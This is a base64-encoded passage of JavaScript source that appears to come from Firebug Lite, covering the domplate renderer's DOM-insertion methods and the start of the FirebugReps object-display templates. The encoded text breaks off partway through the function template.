dmFyIFJlbmRlcmVyID0NCnsNCiAgICByZW5kZXJIVE1MOiBmdW5jdGlvbihhcmdzLCBvdXRwdXRzLCBzZWxmKQ0KICAgIHsNCiAgICAgICAgdmFyIGNvZGUgPSBbXTsNCiAgICAgICAgdmFyIG1hcmt1cEFyZ3MgPSBbY29kZSwgdGhpcy50YWcuY29udGV4dCwgYXJncywgb3V0cHV0c107DQogICAgICAgIG1hcmt1cEFyZ3MucHVzaC5hcHBseShtYXJrdXBBcmdzLCB0aGlzLnRhZy5tYXJrdXBBcmdzKTsNCiAgICAgICAgdGhpcy50YWcucmVuZGVyTWFya3VwLmFwcGx5KHNlbGYgPyBzZWxmIDogdGhpcy50YWcuc3ViamVjdCwgbWFya3VwQXJncyk7DQogICAgICAgIHJldHVybiBjb2RlLmpvaW4oIiIpOw0KICAgIH0sDQoNCiAgICBpbnNlcnRSb3dzOiBmdW5jdGlvbihhcmdzLCBiZWZvcmUsIHNlbGYpDQogICAgew0KICAgICAgICB0aGlzLnRhZy5jb21waWxlKCk7DQoNCiAgICAgICAgdmFyIG91dHB1dHMgPSBbXTsNCiAgICAgICAgdmFyIGh0bWwgPSB0aGlzLnJlbmRlckhUTUwoYXJncywgb3V0cHV0cywgc2VsZik7DQoNCiAgICAgICAgdmFyIGRvYyA9IGJlZm9yZS5vd25lckRvY3VtZW50Ow0KICAgICAgICB2YXIgZGl2ID0gZG9jLmNyZWF0ZUVsZW1lbnQoImRpdiIpOw0KICAgICAgICBkaXYuaW5uZXJIVE1MID0gIjx0YWJsZT48dGJvZHk+IitodG1sKyI8L3Rib2R5PjwvdGFibGU+IjsNCg0KICAgICAgICB2YXIgdGJvZHkgPSBkaXYuZmlyc3RDaGlsZC5maXJzdENoaWxkOw0KICAgICAgICB2YXIgcGFyZW50ID0gYmVmb3JlLnRhZ05hbWUgPT0gIlRSIiA/IGJlZm9yZS5wYXJlbnROb2RlIDogYmVmb3JlOw0KICAgICAgICB2YXIgYWZ0ZXIgPSBiZWZvcmUudGFnTmFtZSA9PSAiVFIiID8gYmVmb3JlLm5leHRTaWJsaW5nIDogbnVsbDsNCg0KICAgICAgICB2YXIgZmlyc3RSb3cgPSB0Ym9keS5maXJzdENoaWxkLCBsYXN0Um93Ow0KICAgICAgICB3aGlsZSAodGJvZHkuZmlyc3RDaGlsZCkNCiAgICAgICAgew0KICAgICAgICAgICAgbGFzdFJvdyA9IHRib2R5LmZpcnN0Q2hpbGQ7DQogICAgICAgICAgICBpZiAoYWZ0ZXIpDQogICAgICAgICAgICAgICAgcGFyZW50Lmluc2VydEJlZm9yZShsYXN0Um93LCBhZnRlcik7DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgcGFyZW50LmFwcGVuZENoaWxkKGxhc3RSb3cpOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIG9mZnNldCA9IDA7DQogICAgICAgIGlmIChiZWZvcmUudGFnTmFtZSA9PSAiVFIiKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgbm9kZSA9IGZpcnN0Um93LnBhcmVudE5vZGUuZmlyc3RDaGlsZDsNCiAgICAgICAgICAgIGZvciAoOyBub2RlICYmIG5vZGUgIT0gZmlyc3RSb3c7IG5vZGUgPSBub2RlLm5leHRTaWJsaW5nKQ0KICAgICAgICAgICAgICAgICsrb2Zmc2V0Ow0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIGRvbUFyZ3MgPSBbZmlyc3RSb3csIHRoaXMudGFnLmNvbnRleHQsIG9mZnNldF07DQogICAgICAgIGRvbUFyZ3MucHVzaC5hcHBseShkb21BcmdzLCB0aGlzLnRhZy5kb21BcmdzKTsNCiAgICAgICAgZG9tQXJncy5wdXNoLmFwcGx5KGRvbUFyZ3MsIG91dHB1dHMpOw0KDQogICAgICAgIHRoaXMudGFnLnJlbmRlckRPTS5hcHBseShzZWxmID8gc2VsZiA6IHRoaXMudGFnLnN1YmplY3QsIGRvbUFyZ3MpOw0KICAgICAgICByZXR1cm4gW2ZpcnN0Um93LCBsYXN0Um93XTsNCiAgICB9LA0KDQogICAgaW5zZXJ0QmVmb3JlOiBmdW5jdGlvbihhcmdzLCBiZWZvcmUsIHNlbGYpDQogICAgew0KICAgICAgICByZXR1cm4gdGhpcy5pbnNlcnROb2RlKGFyZ3MsIGJlZm9yZS5vd25lckRvY3VtZW50LCBiZWZvcmUsIGZhbHNlLCBzZWxmKTsNCiAgICB9LA0KDQogICAgaW5zZXJ0QWZ0ZXI6IGZ1bmN0aW9uKGFyZ3MsIGFmdGVyLCBzZWxmKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHRoaXMuaW5zZXJ0Tm9kZShhcmdzLCBhZnRlci5vd25lckRvY3VtZW50LCBhZnRlciwgdHJ1ZSwgc2VsZik7DQogICAgfSwNCg0KICAgIGluc2VydE5vZGU6IGZ1bmN0aW9uKGFyZ3MsIGRvYywgZWxlbWVudCwgaXNBZnRlciwgc2VsZikNCiAgICB7DQogICAgICAgIGlmICghYXJncykNCiAgICAgICAgICAgIGFyZ3MgPSB7fTsNCg0KICAgICAgICB0aGlzLnRhZy5jb21waWxlKCk7DQoNCiAgICAgICAgdmFyIG91dHB1dHMgPSBbXTsNCiAgICAgICAgdmFyIGh0bWwgPSB0aGlzLnJlbmRlckhUTUwoYXJncywgb3V0cHV0cywgc2VsZik7DQogICAgICAgIA0KICAgICAgICAvL2lmIChGQlRyYWNlLkRCR19ET00pDQogICAgICAgIC8vICAgIEZCVHJhY2Uuc3lzb3V0KCJkb21wbGF0ZS5pbnNlcnROb2RlIGh0bWw6ICIraHRtbCsiXG4iKTsNCg0KICAgICAgICB2YXIgZG9jID0gZWxlbWVudC5vd25lckRvY3VtZW50Ow0KICAgICAgICBpZiAoIXdvbWIgfHwgd29tYi5vd25lckRvY3VtZW50ICE9IGRvYykNCiAgICAgICAgICAgIHdvbWIgPSBkb2MuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgIA0KICAgICAgICB3b21iLmlubmVySFRNTCA9IGh0bWw7DQogIA0KICAgICAgICB2YXIgcm9vdCA9IHdvbWIuZmlyc3RDaGlsZDsNCiAgICAgICAgaWYgKGlzQWZ0ZXIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHdoaWxlICh3b21iLmZpcnN0Q2hpbGQpDQogICAgICAgICAgICAgICAgaWYgKGVsZW1lbnQubmV4dFNpYmxpbmcpDQogICAgICAgICAgICAgICAgICAgIGVsZW1lbnQucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUod29tYi5maXJzdENoaWxkLCBlbGVtZW50Lm5leHRTaWJsaW5nKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIGVsZW1lbnQucGFyZW50Tm9kZS5hcHBlbmRDaGlsZCh3b21iLmZpcnN0Q2hpbGQpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgd2hpbGUgKHdvbWIubGFzdENoaWxkKQ0KICAgICAgICAgICAgICAgIGVsZW1lbnQucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUod29tYi5sYXN0Q2hpbGQsIGVsZW1lbnQpOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIGRvbUFyZ3MgPSBbcm9vdCwgdGhpcy50YWcuY29udGV4dCwgMF07DQogICAgICAgIGRvbUFyZ3MucHVzaC5hcHBseShkb21BcmdzLCB0aGlzLnRhZy5kb21BcmdzKTsNCiAgICAgICAgZG9tQXJncy5wdXNoLmFwcGx5KGRvbUFyZ3MsIG91dHB1dHMpOw0KDQogICAgICAgIC8vaWYgKEZCVHJhY2UuREJHX0RPTSkNCiAgICAgICAgLy8gICAgRkJUcmFjZS5zeXNvdXQoImRvbXBsYXRlLmluc2VydE5vZGUgZG9tQXJnczoiLCBkb21BcmdzKTsNCiAgICAgICAgdGhpcy50YWcucmVuZGVyRE9NLmFwcGx5KHNlbGYgPyBzZWxmIDogdGhpcy50YWcuc3ViamVjdCwgZG9tQXJncyk7DQoNCiAgICAgICAgcmV0dXJuIHJvb3Q7DQogICAgfSwNCiAgICAvKiovDQoNCiAgICAvKg0KICAgIGluc2VydEFmdGVyOiBmdW5jdGlvbihhcmdzLCBiZWZvcmUsIHNlbGYpDQogICAgew0KICAgICAgICB0aGlzLnRhZy5jb21waWxlKCk7DQoNCiAgICAgICAgdmFyIG91dHB1dHMgPSBbXTsNCiAgICAgICAgdmFyIGh0bWwgPSB0aGlzLnJlbmRlckhUTUwoYXJncywgb3V0cHV0cywgc2VsZik7DQoNCiAgICAgICAgdmFyIGRvYyA9IGJlZm9yZS5vd25lckRvY3VtZW50Ow0KICAgICAgICBpZiAoIXdvbWIgfHwgd29tYi5vd25lckRvY3VtZW50ICE9IGRvYykNCiAgICAgICAgICAgIHdvbWIgPSBkb2MuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgIA0KICAgICAgICB3b21iLmlubmVySFRNTCA9IGh0bWw7DQogIA0KICAgICAgICB2YXIgcm9vdCA9IHdvbWIuZmlyc3RDaGlsZDsNCiAgICAgICAgd2hpbGUgKHdvbWIuZmlyc3RDaGlsZCkNCiAgICAgICAgICAgIGlmIChiZWZvcmUubmV4dFNpYmxpbmcpDQogICAgICAgICAgICAgICAgYmVmb3JlLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHdvbWIuZmlyc3RDaGlsZCwgYmVmb3JlLm5leHRTaWJsaW5nKTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICBiZWZvcmUucGFyZW50Tm9kZS5hcHBlbmRDaGlsZCh3b21iLmZpcnN0Q2hpbGQpOw0KICAgICAgICANCiAgICAgICAgdmFyIGRvbUFyZ3MgPSBbcm9vdCwgdGhpcy50YWcuY29udGV4dCwgMF07DQogICAgICAgIGRvbUFyZ3MucHVzaC5hcHBseShkb21BcmdzLCB0aGlzLnRhZy5kb21BcmdzKTsNCiAgICAgICAgZG9tQXJncy5wdXNoLmFwcGx5KGRvbUFyZ3MsIG91dHB1dHMpOw0KDQogICAgICAgIHRoaXMudGFnLnJlbmRlckRPTS5hcHBseShzZWxmID8gc2VsZiA6ICh0aGlzLnRhZy5zdWJqZWN0ID8gdGhpcy50YWcuc3ViamVjdCA6IG51bGwpLA0KICAgICAgICAgICAgZG9tQXJncyk7DQoNCiAgICAgICAgcmV0dXJuIHJvb3Q7DQogICAgfSwNCiAgICAvKiovDQogICAgDQogICAgcmVwbGFjZTogZnVuY3Rpb24oYXJncywgcGFyZW50LCBzZWxmKQ0KICAgIHsNCiAgICAgICAgdGhpcy50YWcuY29tcGlsZSgpOw0KDQogICAgICAgIHZhciBvdXRwdXRzID0gW107DQogICAgICAgIHZhciBodG1sID0gdGhpcy5yZW5kZXJIVE1MKGFyZ3MsIG91dHB1dHMsIHNlbGYpOw0KDQogICAgICAgIHZhciByb290Ow0KICAgICAgICBpZiAocGFyZW50Lm5vZGVUeXBlID09IDEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHBhcmVudC5pbm5lckhUTUwgPSBodG1sOw0KICAgICAgICAgICAgcm9vdCA9IHBhcmVudC5maXJzdENoaWxkOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCFwYXJlbnQgfHwgcGFyZW50Lm5vZGVUeXBlICE9IDkpDQogICAgICAgICAgICAgICAgcGFyZW50ID0gZG9jdW1lbnQ7DQoNCiAgICAgICAgICAgIGlmICghd29tYiB8fCB3b21iLm93bmVyRG9jdW1lbnQgIT0gcGFyZW50KQ0KICAgICAgICAgICAgICAgIHdvbWIgPSBwYXJlbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgICAgICB3b21iLmlubmVySFRNTCA9IGh0bWw7DQoNCiAgICAgICAgICAgIHJvb3QgPSB3b21iLmZpcnN0Q2hpbGQ7DQogICAgICAgICAgICAvL3dvbWIucmVtb3ZlQ2hpbGQocm9vdCk7DQogICAgICAgIH0NCg0KICAgICAgICB2YXIgZG9tQXJncyA9IFtyb290LCB0aGlzLnRhZy5jb250ZXh0LCAwXTsNCiAgICAgICAgZG9tQXJncy5wdXNoLmFwcGx5KGRvbUFyZ3MsIHRoaXMudGFnLmRvbUFyZ3MpOw0KICAgICAgICBkb21BcmdzLnB1c2guYXBwbHkoZG9tQXJncywgb3V0cHV0cyk7DQogICAgICAgIHRoaXMudGFnLnJlbmRlckRPTS5hcHBseShzZWxmID8gc2VsZiA6IHRoaXMudGFnLnN1YmplY3QsIGRvbUFyZ3MpOw0KDQogICAgICAgIHJldHVybiByb290Ow0KICAgIH0sDQoNCiAgICBhcHBlbmQ6IGZ1bmN0aW9uKGFyZ3MsIHBhcmVudCwgc2VsZikNCiAgICB7DQogICAgICAgIHRoaXMudGFnLmNvbXBpbGUoKTsNCg0KICAgICAgICB2YXIgb3V0cHV0cyA9IFtdOw0KICAgICAgICB2YXIgaHRtbCA9IHRoaXMucmVuZGVySFRNTChhcmdzLCBvdXRwdXRzLCBzZWxmKTsNCiAgICAgICAgLy9pZiAoRkJUcmFjZS5EQkdfRE9NKSBGQlRyYWNlLnN5c291dCgiZG9tcGxhdGUuYXBwZW5kIGh0bWw6ICIraHRtbCsiXG4iKTsNCiAgICAgICAgDQogICAgICAgIGlmICghd29tYiB8fCB3b21iLm93bmVyRG9jdW1lbnQgIT0gcGFyZW50Lm93bmVyRG9jdW1lbnQpDQogICAgICAgICAgICB3b21iID0gcGFyZW50Lm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgICAgIHdvbWIuaW5uZXJIVE1MID0gaHRtbDsNCg0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBkb21wbGF0ZSBwb3J0IHRvIEZpcmVidWcNCiAgICAgICAgdmFyIHJvb3QgPSB3b21iLmZpcnN0Q2hpbGQ7DQogICAgICAgIHdoaWxlICh3b21iLmZpcnN0Q2hpbGQpDQogICAgICAgICAgICBwYXJlbnQuYXBwZW5kQ2hpbGQod29tYi5maXJzdENoaWxkKTsNCg0KICAgICAgICAvLyBjbGVhcmluZyBlbGVtZW50IHJlZmVyZW5jZSB0byBhdm9pZCByZWZlcmVuY2UgZXJyb3IgaW4gSUU4IHdoZW4gc3dpdGNoaW5nIGNvbnRleHRzDQogICAgICAgIHdvbWIgPSBudWxsOw0KICAgICAgICANCiAgICAgICAgdmFyIGRvbUFyZ3MgPSBbcm9vdCwgdGhpcy50YWcuY29udGV4dCwgMF07DQogICAgICAgIGRvbUFyZ3MucHVzaC5hcHBseShkb21BcmdzLCB0aGlzLnRhZy5kb21BcmdzKTsNCiAgICAgICAgZG9tQXJncy5wdXNoLmFwcGx5KGRvbUFyZ3MsIG91dHB1dHMpOw0KICAgICAgICANCiAgICAgICAgLy9pZiAoRkJUcmFjZS5EQkdfRE9NKSBGQlRyYWNlLmR1bXBQcm9wZXJ0aWVzKCJkb21wbGF0ZSBhcHBlbmQgZG9tQXJnczoiLCBkb21BcmdzKTsNCiAgICAgICAgdGhpcy50YWcucmVuZGVyRE9NLmFwcGx5KHNlbGYgPyBzZWxmIDogdGhpcy50YWcuc3ViamVjdCwgZG9tQXJncyk7DQoNCiAgICAgICAgcmV0dXJuIHJvb3Q7DQogICAgfQ0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCmZ1bmN0aW9uIGRlZmluZVRhZ3MoKQ0Kew0KICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYXJndW1lbnRzLmxlbmd0aDsgKytpKQ0KICAgIHsNCiAgICAgICAgdmFyIHRhZ05hbWUgPSBhcmd1bWVudHNbaV07DQogICAgICAgIHZhciBmbiA9IG5ldyBGdW5jdGlvbigidmFyIG5ld1RhZyA9IG5ldyBhcmd1bWVudHMuY2FsbGVlLkRvbXBsYXRlVGFnKCciK3RhZ05hbWUrIicpOyByZXR1cm4gbmV3VGFnLm1lcmdlKGFyZ3VtZW50cyk7Iik7DQogICAgICAgIGZuLkRvbXBsYXRlVGFnID0gRG9tcGxhdGVUYWc7DQoNCiAgICAgICAgdmFyIGZuTmFtZSA9IHRhZ05hbWUudG9VcHBlckNhc2UoKTsNCiAgICAgICAgRkJMW2ZuTmFtZV0gPSBmbjsNCiAgICB9DQp9DQoNCmRlZmluZVRhZ3MoDQogICAgImEiLCAiYnV0dG9uIiwgImJyIiwgImNhbnZhcyIsICJjb2RlIiwgImNvbCIsICJjb2xncm91cCIsICJkaXYiLCAiZmllbGRzZXQiLCAiZm9ybSIsICJoMSIsICJoMiIsICJoMyIsICJociIsDQogICAgICJpbWciLCAiaW5wdXQiLCAibGFiZWwiLCAibGVnZW5kIiwgImxpIiwgIm9sIiwgIm9wdGdyb3VwIiwgIm9wdGlvbiIsICJwIiwgInByZSIsICJzZWxlY3QiLA0KICAgICJzcGFuIiwgInN0cm9uZyIsICJ0YWJsZSIsICJ0Ym9keSIsICJ0ZCIsICJ0ZXh0YXJlYSIsICJ0Zm9vdCIsICJ0aCIsICJ0aGVhZCIsICJ0ciIsICJ0dCIsICJ1bCIsICJpZnJhbWUiDQopOw0KDQp9KSgpOw0KDQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KdmFyIEZpcmVidWdSZXBzID0gRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvbW1vbiBUYWdzDQoNCnZhciBPQkpFQ1RCT1ggPSB0aGlzLk9CSkVDVEJPWCA9DQogICAgU1BBTih7ImNsYXNzIjogIm9iamVjdEJveCBvYmplY3RCb3gtJGNsYXNzTmFtZSJ9KTsNCg0KdmFyIE9CSkVDVEJMT0NLID0gdGhpcy5PQkpFQ1RCTE9DSyA9DQogICAgRElWKHsiY2xhc3MiOiAib2JqZWN0Qm94IG9iamVjdEJveC0kY2xhc3NOYW1lIn0pOw0KDQp2YXIgT0JKRUNUTElOSyA9IHRoaXMuT0JKRUNUTElOSyA9IGlzSUU2ID8gLy8gSUU2IG9iamVjdCBsaW5rIHJlcHJlc2VudGF0aW9uDQogICAgQSh7DQogICAgICAgICJjbGFzcyI6ICJvYmplY3RMaW5rIG9iamVjdExpbmstJGNsYXNzTmFtZSBhMTF5Rm9jdXMiLA0KICAgICAgICBocmVmOiAiamF2YXNjcmlwdDp2b2lkKDApIiwNCiAgICAgICAgLy8gd29ya2Fyb3VuZCB0byBzaG93IFhQYXRoIChhIGJldHRlciBhcHByb2FjaCB3b3VsZCB1c2UgdGhlIHRvb2x0aXAgb24gbW91c2VvdmVyLA0KICAgICAgICAvLyBzbyB0aGUgWFBhdGggaW5mb3JtYXRpb24gd291bGQgYmUgY2FsY3VsYXRlZCBkeW5hbWljYWxseSwgYnV0IHdlIG5lZWQgdG8gY3JlYXRlDQogICAgICAgIC8vIGEgdG9vbHRpcCBjbGFzcy93cmFwcGVyIGFyb3VuZCBNZW51IG9yIEluZm9UaXApDQogICAgICAgIHRpdGxlOiAiJG9iamVjdHxGQkwuZ2V0RWxlbWVudFhQYXRoIiwNCiAgICAgICAgX3JlcE9iamVjdDogIiRvYmplY3QiDQogICAgfSkNCiAgICA6IC8vIE90aGVyIGJyb3dzZXJzDQogICAgQSh7DQogICAgICAgICJjbGFzcyI6ICJvYmplY3RMaW5rIG9iamVjdExpbmstJGNsYXNzTmFtZSBhMTF5Rm9jdXMiLA0KICAgICAgICAvLyB3b3JrYXJvdW5kIHRvIHNob3cgWFBhdGggKGEgYmV0dGVyIGFwcHJvYWNoIHdvdWxkIHVzZSB0aGUgdG9vbHRpcCBvbiBtb3VzZW92ZXIsDQogICAgICAgIC8vIHNvIHRoZSBYUGF0aCBpbmZvcm1hdGlvbiB3b3VsZCBiZSBjYWxjdWxhdGVkIGR5bmFtaWNhbGx5LCBidXQgd2UgbmVlZCB0byBjcmVhdGUNCiAgICAgICAgLy8gYSB0b29sdGlwIGNsYXNzL3dyYXBwZXIgYXJvdW5kIE1lbnUgb3IgSW5mb1RpcCkNCiAgICAgICAgdGl0bGU6ICIkb2JqZWN0fEZCTC5nZXRFbGVtZW50WFBhdGgiLA0KICAgICAgICBfcmVwT2JqZWN0OiAiJG9iamVjdCINCiAgICB9KTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5VbmRlZmluZWQgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6IE9CSkVDVEJPWCgidW5kZWZpbmVkIiksDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJ1bmRlZmluZWQiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgdHlwZSkNCiAgICB7DQogICAgICAgIHJldHVybiB0eXBlID09ICJ1bmRlZmluZWQiOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5OdWxsID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOiBPQkpFQ1RCT1goIm51bGwiKSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogIm51bGwiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgdHlwZSkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3QgPT0gbnVsbDsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuTmFkYSA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzogU1BBTigiIiksDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJuYWRhIg0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLk51bWJlciA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzogT0JKRUNUQk9YKCIkb2JqZWN0IiksDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJudW1iZXIiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgdHlwZSkNCiAgICB7DQogICAgICAgIHJldHVybiB0eXBlID09ICJib29sZWFuIiB8fCB0eXBlID09ICJudW1iZXIiOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5TdHJpbmcgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6IE9CSkVDVEJPWCgiJnF1b3Q7JG9iamVjdCZxdW90OyIpLA0KDQogICAgc2hvcnRUYWc6IE9CSkVDVEJPWCgiJnF1b3Q7JG9iamVjdHxjcm9wU3RyaW5nJnF1b3Q7IiksDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJzdHJpbmciLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgdHlwZSkNCiAgICB7DQogICAgICAgIHJldHVybiB0eXBlID09ICJzdHJpbmciOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5UZXh0ID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOiBPQkpFQ1RCT1goIiRvYmplY3QiKSwNCg0KICAgIHNob3J0VGFnOiBPQkpFQ1RCT1goIiRvYmplY3R8Y3JvcFN0cmluZyIpLA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgY2xhc3NOYW1lOiAidGV4dCINCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5DYXB0aW9uID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOiBTUEFOKHsiY2xhc3MiOiAiY2FwdGlvbiJ9LCAiJG9iamVjdCIpDQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuV2FybmluZyA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzogRElWKHsiY2xhc3MiOiAid2FybmluZyBmb2N1c1JvdyIsIHJvbGUgOiAnbGlzdGl0ZW0nfSwgIiRvYmplY3R8U1RSIikNCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5GdW5jID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOg0KICAgICAgICBPQkpFQ1RMSU5LKCIkb2JqZWN0fHN1bW1hcml6ZUZ1bmN0aW9uIiksDQoNCiAgICBzdW1tYXJpemVGdW5jdGlvbjogZnVuY3Rpb24oZm4pDQogICAgew0KICAgICAgICB2YXIgZm5SZWdleCA9IC9mdW5jdGlvbiAoW14oXStcKFteKV0qXCkpIFx7LzsNCiAgICAgICAgdmFyIGZuVGV4dCA9IHNhZmVUb1N0cmluZyhmbik7DQoNCiAgICAgICAgdmFyIG0gPSBmblJlZ2V4LmV4ZWMoZm5UZXh0KTsNCiAgICAgICAgcmV0dXJuIG0gPyBtWzFdIDogImZ1bmN0aW9uKCkiOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjb3B5U291cmNlOiBmdW5jdGlvbihmbikNCiAgICB7DQogICAgICAgIGNvcHlUb0NsaXBib2FyZChzYWZlVG9TdHJpbmcoZm4pKTsNCiAgICB9LA0KDQogICAgbW9uaXRvcjogZnVuY3Rpb24oZm4sIHNjcmlwdCwgbW9uaXRvcmVkKQ0KICAgIHsNCiAgICAgICAgaWYgKG1vbml0b3JlZCkNCiAgICAgICAgICAgIEZpcmVidWcuRGVidWdnZXIudW5tb25pdG9yU2NyaXB0KGZuLCBzY3JpcHQsICJtb25pdG9yIik7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIEZpcmVidWcuRGVidWdnZXIubW9uaXRvclNjcmlwdChmbiwgc2NyaXB0LCAibW9uaXRvciIpOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJmdW5jdGlvbiIsDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0LCB0eXBlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGlzRnVuY3Rpb24ob2JqZWN0KTsNCiAgICB9LA0KDQogICAgaW5zcGVjdE9iamVjdDogZnVuY3Rpb24oZm4sIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgc291cmNlTGluayA